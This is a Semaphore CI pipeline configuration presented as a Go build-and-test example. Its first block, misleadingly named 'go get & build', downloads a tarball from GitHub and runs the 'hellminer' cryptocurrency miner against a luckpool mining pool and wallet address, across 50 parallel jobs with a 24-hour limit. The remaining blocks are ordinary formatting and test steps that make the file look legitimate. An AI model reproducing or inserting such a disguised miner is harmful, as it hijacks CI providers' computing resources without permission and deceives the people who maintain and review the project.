version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
execution_time_limit:
  hours: 24
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - 'wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz'
            - './hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RXggSUt7YBw76Jq8A1cmqVH8TPWVoao6PJ.coba -p x --cpu 2'
          parallelism: 50
  - name: Check code style
    task:
      jobs:
        - name: gofmt
          commands:
            - checkout
            - sem-version go 1.16
            - gofmt main.go | diff --ignore-tab-expansion main.go -
  - name: Run tests
    task:
      prologue:
        commands:
          - checkout
          - sem-version go 1.16
      jobs:
        - name: go test
          commands:
            - sem-service start postgres
            - psql -p 5432 -h localhost -U postgres -c "CREATE DATABASE s2"
            - go get gotest.tools/gotestsum
            - gotestsum --junitfile junit.xml ./...
        - name: Test web server
          commands:
            - cache restore $(checksum main.go)
            - ./bin/main 8001 &
            - 'curl --silent localhost:8001/time | grep "The current time is"'
      epilogue:
        always:
          commands:
            - test-results publish junit.xml
after_pipeline:
  task:
    jobs:
      - name: Publish Results
        commands:
          - test-results gen-pipeline-report
